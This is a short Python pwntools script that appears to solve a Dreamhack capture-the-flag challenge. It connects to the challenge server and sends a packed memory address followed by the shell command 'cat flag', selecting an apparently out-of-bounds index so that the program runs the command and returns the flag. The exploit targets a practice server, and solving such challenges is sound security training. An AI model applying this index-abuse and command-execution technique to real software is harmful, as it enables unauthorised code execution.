from pwn import *

p=remote('host3.dreamhack.games', 16874)

payload=p32(0x804a0ac+4)
payload+=b"cat flag"

p.sendlineafter("name: ", payload)

p.sendlineafter("want?: ", b"19")

flag=p.recv(100)
print(flag.decode('utf-8'))
